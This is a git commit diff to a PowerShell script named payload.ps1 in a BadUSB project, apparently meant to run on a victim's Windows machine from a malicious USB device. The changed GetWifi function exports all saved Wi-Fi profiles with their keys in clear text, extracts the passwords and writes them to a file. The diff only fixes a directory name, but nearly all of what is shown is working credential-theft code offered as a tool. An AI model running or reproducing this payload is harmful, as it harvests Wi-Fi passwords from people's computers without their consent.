f5c03c8c12a42f166a304175d9c3fb377caa1d76
8ad3rror <zimny30c@gmail.com>
2024-12-13 18:36:02 +0100

    up

--- BadUSB/BulletURL/payload.ps1
+++ BadUSB/BulletURL/payload.ps1
@@ -10,7 +10,7 @@ function GetVersion {
 
 function GetWifi {
    New-Item -Path $env:temp -Name "8ad3rror" -ItemType "directory"
-   Set-Location -Path "$env:temp/js2k3kd4nne5dhsk"; netsh wlan export profile key=clear
+   Set-Location -Path "$env:temp/8ad3rror"; netsh wlan export profile key=clear
    Select-String -Path *.xml -Pattern 'keyMaterial' | % { $_ -replace '</?keyMaterial>', ''} | % {$_ -replace "C:\\Users\\$env:UserName\\Desktop\\", ''} | % {$_ -replace '.xml:22:', ''} | Out-File "C:\temp\Wifi.txt"
 }
 
